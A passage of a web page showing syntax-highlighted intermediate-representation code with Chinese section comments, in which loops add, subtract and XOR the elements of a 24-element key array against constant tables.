class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp71</span><br><span class="line">  GOTO label43</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//第4个循环，运算4</span></span><br><span class="line">LABEL label41 :</span><br><span class="line">  temp75 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp75</span><br><span class="line">LABEL label54 :</span><br><span class="line">  temp77 := #<span class="number">24</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp77 GOTO label53</span><br><span class="line">  GOTO label52</span><br><span class="line">LABEL label53 :</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp78 := #<span class="number">1</span></span><br><span class="line">  temp79 := var15&lt;+<span class="number">56</span>&gt; - temp78</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := temp79</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var20&lt;+<span class="number">96</span>&gt; := var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var17&lt;+<span class="number">72</span>&gt; + var20&lt;+<span class="number">96</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt; := var17&lt;+<span class="number">72</span>&gt;</span><br><span class="line">  temp76 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp76</span><br><span class="line">  GOTO label54</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//第5个循环，运算5</span></span><br><span class="line">LABEL label52 :</span><br><span class="line">  temp81 := #<span class="number">0</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp81</span><br><span class="line">LABEL label61 :</span><br><span class="line">  temp83 := #<span class="number">23</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp83 GOTO label60</span><br><span class="line">  GOTO label59</span><br><span class="line">LABEL label60 :</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var12&lt;+<span class="number">32</span>&gt; := var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp84 := #<span class="number">1</span></span><br><span class="line">  temp85 := var15&lt;+<span class="number">56</span>&gt; + temp84</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := temp85</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var13&lt;+<span class="number">40</span>&gt; := var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp86 := #<span class="number">0</span></span><br><span class="line">  var13&lt;+<span class="number">40</span>&gt; := temp86</span><br><span class="line">  temp87 := var12&lt;+<span class="number">32</span>&gt; ^ var13&lt;+<span class="number">40</span>&gt;</span><br><span class="line">  var14&lt;+<span class="number">48</span>&gt; := temp87</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt; := var14&lt;+<span class="number">48</span>&gt;</span><br><span class="line">  temp82 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp82</span><br><span class="line">  GOTO label61</span><br><span class="line"></span><br><span class="line">  <span class="comment">//第2个赋值区</span></span><br><span class="line">LABEL label59 :</span><br><span class="line">  temp89 := #<span class="number">0</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.L[<span class="number">0</span>])&lt;+<span class="number">200</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp89</span><br><span class="line">  temp91 := #<span class="number">12</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.R[<span class="number">0</span>])&lt;+<span class="number">264</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp91</span><br><span class="line">  temp93 := #<span class="number">0</span></span><br><span class="line">  temp94 := #<span class="number">19</span></span><br><span class="line">  temp95 := temp93 - temp94</span><br><span class="line">  var24(@<span class="built_in">exp</span>.X[<span class="number">0</span>])&lt;+<span class="number">328</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp95</span><br><span class="line"></span><br><span class="line"><span class="comment">//数组的一个赋值</span></span><br><span class="line">  temp97 := #<span class="number">9</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.L[<span class="number">1</span>])&lt;+<span class="number">208</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp97</span><br><span class="line">  temp99 := #<span class="number">10</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.R[<span class="number">1</span>])&lt;+<span class="number">272</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp99</span><br><span class="line">  temp101 := #<span class="number">0</span></span><br><span class="line">  temp102 := #<span class="number">10</span></span><br><span class="line">  temp103 := temp101 - temp102</span><br><span class="line">  var24(@<span class="built_in">exp</span>.X[<span class="number">1</span>])&lt;+<span class="number">336</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp103</span><br><span class="line">  temp105 := #<span class="number">9</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.L[<span class="number">2</span>])&lt;+<span class="number">216</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp105</span><br><span class="line">  temp107 := #<span class="number">12</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.R[<span class="number">2</span>])&lt;+<span class="number">280</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp107</span><br><span class="line">  temp109 := #<span class="number">3</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.X[<span class="number">2</span>])&lt;+<span class="number">344</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp109</span><br><span class="line">  temp111 := #<span class="number">8</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.L[<span class="number">3</span>])&lt;+<span class="number">224</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp111</span><br><span class="line">  temp113 := #<span class="number">19</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.R[<span class="number">3</span>])&lt;+<span class="number">288</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp113</span><br><span class="line">  temp115 := #<span class="number">0</span></span><br><span class="line">  temp116 := #<span class="number">11</span></span><br><span class="line">  temp117 := temp115 - temp116</span><br><span class="line">  var24(@<span class="built_in">exp</span>.X[<span class="number">3</span>])&lt;+<span class="number">352</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp117</span><br><span class="line">  temp119 := #<span class="number">10</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.L[<span class="number">4</span>])&lt;+<span class="number">232</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp119</span><br><span class="line">  temp121 := #<span class="number">12</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.R[<span class="number">4</span>])&lt;+<span class="number">296</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp121</span><br><span class="line">  temp123 := #<span class="number">0</span></span><br><span class="line">  temp124 := #<span class="number">9</span></span><br><span class="line">  temp125 := temp123 - temp124</span><br><span class="line">  var24(@<span class="built_in">exp</span>.X[<span class="number">4</span>])&lt;+<span class="number">360</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp125</span><br><span class="line">  temp127 := #<span class="number">9</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.L[<span class="number">5</span>])&lt;+<span class="number">240</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp127</span><br><span class="line">  temp129 := #<span class="number">13</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.R[<span class="number">5</span>])&lt;+<span class="number">304</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp129</span><br><span class="line">  temp131 := #<span class="number">3</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.X[<span class="number">5</span>])&lt;+<span class="number">368</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp131</span><br><span class="line">  temp133 := #<span class="number">1</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.L[<span class="number">6</span>])&lt;+<span class="number">248</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp133</span><br><span class="line">  temp135 := #<span class="number">22</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.R[<span class="number">6</span>])&lt;+<span class="number">312</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp135</span><br><span class="line">  temp137 := #<span class="number">0</span></span><br><span class="line">  temp138 := #<span class="number">19</span></span><br><span class="line">  temp139 := temp137 - temp138</span><br><span class="line">  var24(@<span class="built_in">exp</span>.X[<span class="number">6</span>])&lt;+<span class="number">376</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp139</span><br><span class="line">  temp141 := #<span class="number">0</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.L[<span class="number">7</span>])&lt;+<span class="number">256</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp141</span><br><span class="line">  temp143 := #<span class="number">23</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.R[<span class="number">7</span>])&lt;+<span class="number">320</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp143</span><br><span class="line">  temp145 := #<span class="number">7</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.X[<span class="number">7</span>])&lt;+<span class="number">384</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp145</span><br><span class="line">  temp147 := #<span class="number">12</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp147</span><br><span class="line">  temp149 := #<span class="number">31</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">1</span>])&lt;+<span class="number">16</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp149</span><br><span class="line">  temp151 := #<span class="number">31</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">2</span>])&lt;+<span class="number">24</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp151</span><br><span class="line">  temp153 := #<span class="number">31</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">3</span>])&lt;+<span class="number">32</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp153</span><br><span class="line">  temp155 := #<span class="number">31</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">4</span>])&lt;+<span class="number">40</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp155</span><br><span class="line">  temp157 := #<span class="number">31</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">5</span>])&lt;+<span class="number">48</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp157</span><br><span class="line">  temp159 := #<span class="number">31</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">6</span>])&lt;+<span class="number">56</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp159</span><br><span class="line">  temp161 := #<span class="number">31</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">7</span>])&lt;+<span class="number">64</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp161</span><br><span class="line">  temp163 := #<span class="number">42</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">8</span>])&lt;+<span class="number">72</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp163</span><br><span class="line">  temp165 := #<span class="number">46</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">9</span>])&lt;+<span class="number">80</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp165</span><br><span class="line">  temp167 := #<span class="number">45</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">10</span>])&lt;+<span class="number">88</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp167</span><br><span class="line">  temp169 := #<span class="number">45</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">11</span>])&lt;+<span class="number">96</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp169</span><br><span class="line">  temp171 := #<span class="number">20</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">12</span>])&lt;+<span class="number">104</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp171</span><br><span class="line">  temp173 := #<span class="number">23</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">13</span>])&lt;+<span class="number">112</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp173</span><br><span class="line">  temp175 := #<span class="number">23</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">14</span>])&lt;+<span class="number">120</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp175</span><br><span class="line">  temp177 := #<span class="number">23</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">15</span>])&lt;+<span class="number">128</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp177</span><br><span class="line">  temp179 := #<span class="number">23</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">16</span>])&lt;+<span class="number">136</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp179</span><br><span class="line">  temp181 := #<span class="number">23</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">17</span>])&lt;+<span class="number">144</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp181</span><br><span class="line">  temp183 := #<span class="number">23</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">18</span>])&lt;+<span class="number">152</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp183</span><br><span class="line">  temp185 := #<span class="number">12</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">19</span>])&lt;+<span class="number">160</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp185</span><br><span class="line">  temp187 := #<span class="number">12</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">20</span>])&lt;+<span class="number">168</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp187</span><br><span class="line">  temp189 := #<span class="number">12</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">21</span>])&lt;+<span class="number">176</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp189</span><br><span class="line">  temp191 := #<span class="number">0</span></span><br><span class="line">  temp192 := #<span class="number">7</span></span><br><span class="line">  temp193 := temp191 - temp192</span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">22</span>])&lt;+<span class="number">184</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp193</span><br><span class="line">  temp195 := #<span class="number">0</span></span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">23</span>])&lt;+<span class="number">192</span>&gt;&lt;+<span class="number">1256</span>&gt; := temp195</span><br><span class="line">  temp196 := #<span class="number">23</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp196</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LABEL label118 :</span><br><span class="line">  temp198 := #<span class="number">0</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &gt; temp198 GOTO label117</span><br><span class="line">  GOTO label116</span><br><span class="line">LABEL label117 :</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var24(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1256</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp199 := #<span class="number">1</span></span><br><span class="line">  temp200 := var15&lt;+<span class="number">56</span>&gt; - temp199</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := temp200</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var24(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1256</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp201 := var19&lt;+<span class="number">88</span>&gt; - var17&lt;+<span class="number">72</span>&gt;</span><br><span class="line">  var21&lt;+<span class="number">104</span>&gt; := temp201</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1256</span>&gt;&lt;+tempa&gt; := var21&lt;+<span class="number">104</span>&gt;</span><br><span class="line">  temp197 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; - temp197</span><br><span class="line">  GOTO label118</span><br><span class="line">LABEL label116 :</span><br><span class="line">  temp202 := #<span class="number">0</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp202</span><br><span class="line">LABEL label126 :</span><br><span class="line">  temp204 := #<span class="number">8</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp204 GOTO label125</span><br><span class="line">  GOTO label124</span><br><span class="line">LABEL label125 :</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var24(@<span class="built_in">exp</span>.L[<span class="number">0</span>])&lt;+<span class="number">200</span>&gt;&lt;+<span class="number">1256</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := var24(@<span class="built_in">exp</span>.R[<span class="number">0</span>])&lt;+<span class="number">264</span>&gt;&lt;+<span class="number">1256</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var20&lt;+<span class="number">96</span>&gt; := var24(@<span class="built_in">exp</span>.X[<span class="number">0</span>])&lt;+<span class="number">328</span>&gt;&lt;+<span class="number">1256</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var24(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1256</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var24(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1256</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var17&lt;+<span class="number">72</span>&gt; + var20&lt;+<span class="number">96</span>&gt;</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var19&lt;+<span class="number">88</span>&gt; - var20&lt;+<span class="number">96</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1256</span>&gt;&lt;+tempa&gt; := var17&lt;+<span class="number">72</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1256</span>&gt;&lt;+tempa&gt; := var19&lt;+<span class="number">88</span>&gt;</span><br><span class="line">  temp203 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp203</span><br><span class="line">  GOTO label126</span><br><span class="line">LABEL label124 :</span><br><span class="line">  temp207 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp207</span><br><span class="line">LABEL label137 :</span><br><span class="line">  temp209 := #<span class="number">24</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp209 GOTO label136</span><br><span class="line">  GOTO label135</span><br><span class="line">LABEL label136 :</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var24(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1256</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp210 := #<span class="number">1</span></span><br><span class="line">  temp211 := var15&lt;+<span class="number">56</span>&gt; - temp210</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := temp211</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var20&lt;+<span class="number">96</span>&gt; := var24(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1256</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var17&lt;+<span class="number">72</span>&gt; + var20&lt;+<span class="number">96</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var24(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1256</span>&gt;&lt;+tempa&gt; := var17&lt;+<span class="number">72</span>&gt;</span><br><span class="line">  temp208 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp208</span><br><span class="line">  GOTO label137</span><br><span class="line">LABEL label135 :</span><br><span class="line">  temp214 := #<span class="number">252</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">872</span>&gt; := temp214</span><br><span class="line">  temp216 := #<span class="number">352</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">1</span>])&lt;+<span class="number">16</span>&gt;&lt;+<span class="number">872</span>&gt; := temp216</span><br><span class="line">  temp218 := #<span class="number">484</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">2</span>])&lt;+<span class="number">24</span>&gt;&lt;+<span class="number">872</span>&gt; := temp218</span><br><span class="line">  temp220 := #<span class="number">470</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">3</span>])&lt;+<span class="number">32</span>&gt;&lt;+<span class="number">872</span>&gt; := temp220</span><br><span class="line">  temp222 := #<span class="number">496</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">4</span>])&lt;+<span class="number">40</span>&gt;&lt;+<span class="number">872</span>&gt; := temp222</span><br><span class="line">  temp224 := #<span class="number">487</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">5</span>])&lt;+<span class="number">48</span>&gt;&lt;+<span class="number">872</span>&gt; := temp224</span><br><span class="line">  temp226 := #<span class="number">539</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">6</span>])&lt;+<span class="number">56</span>&gt;&lt;+<span class="number">872</span>&gt; := temp226</span><br><span class="line">  temp228 := #<span class="number">585</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">7</span>])&lt;+<span class="number">64</span>&gt;&lt;+<span class="number">872</span>&gt; := temp228</span><br><span class="line">  temp230 := #<span class="number">447</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">8</span>])&lt;+<span class="number">72</span>&gt;&lt;+<span class="number">872</span>&gt; := temp230</span><br><span class="line">  temp232 := #<span class="number">474</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">9</span>])&lt;+<span class="number">80</span>&gt;&lt;+<span class="number">872</span>&gt; := temp232</span><br><span class="line">  temp234 := #<span class="number">577</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">10</span>])&lt;+<span class="number">88</span>&gt;&lt;+<span class="number">872</span>&gt; := temp234</span><br><span class="line">  temp236 := #<span class="number">454</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">11</span>])&lt;+<span class="number">96</span>&gt;&lt;+<span class="number">872</span>&gt; := temp236</span><br><span class="line">  temp238 := #<span class="number">466</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">12</span>])&lt;+<span class="number">104</span>&gt;&lt;+<span class="number">872</span>&gt; := temp238</span><br><span class="line">  temp240 := #<span class="number">345</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">13</span>])&lt;+<span class="number">112</span>&gt;&lt;+<span class="number">872</span>&gt; := temp240</span><br><span class="line">  temp242 := #<span class="number">344</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">14</span>])&lt;+<span class="number">120</span>&gt;&lt;+<span class="number">872</span>&gt; := temp242</span><br><span class="line">  temp244 := #<span class="number">486</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">15</span>])&lt;+<span class="number">128</span>&gt;&lt;+<span class="number">872</span>&gt; := temp244</span><br><span class="line">  temp246 := #<span class="number">501</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">16</span>])&lt;+<span class="number">136</span>&gt;&lt;+<span class="number">872</span>&gt; := temp246</span><br><span class="line">  temp248 := #<span class="number">423</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">17</span>])&lt;+<span class="number">144</span>&gt;&lt;+<span class="number">872</span>&gt; := temp248</span><br><span class="line">  temp250 := #<span class="number">490</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">18</span>])&lt;+<span class="number">152</span>&gt;&lt;+<span class="number">872</span>&gt; := temp250</span><br><span class="line">  temp252 := #<span class="number">375</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">19</span>])&lt;+<span class="number">160</span>&gt;&lt;+<span class="number">872</span>&gt; := temp252</span><br><span class="line">  temp254 := #<span class="number">257</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">20</span>])&lt;+<span class="number">168</span>&gt;&lt;+<span class="number">872</span>&gt; := temp254</span><br><span class="line">  temp256 := #<span class="number">203</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">21</span>])&lt;+<span class="number">176</span>&gt;&lt;+<span class="number">872</span>&gt; := temp256</span><br><span class="line">  temp258 := #<span class="number">265</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">22</span>])&lt;+<span class="number">184</span>&gt;&lt;+<span class="number">872</span>&gt; := temp258</span><br><span class="line">  temp260 := #<span class="number">125</span></span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">23</span>])&lt;+<span class="number">192</span>&gt;&lt;+<span class="number">872</span>&gt; := temp260</span><br><span class="line">  temp261 := #<span class="number">0</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp261</span><br><span class="line">LABEL label168 :</span><br><span class="line">  temp263 := #<span class="number">24</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp263 GOTO label167</span><br><span class="line">  GOTO label166</span><br><span class="line">LABEL label167 :</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var23(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var24(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1256</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp264 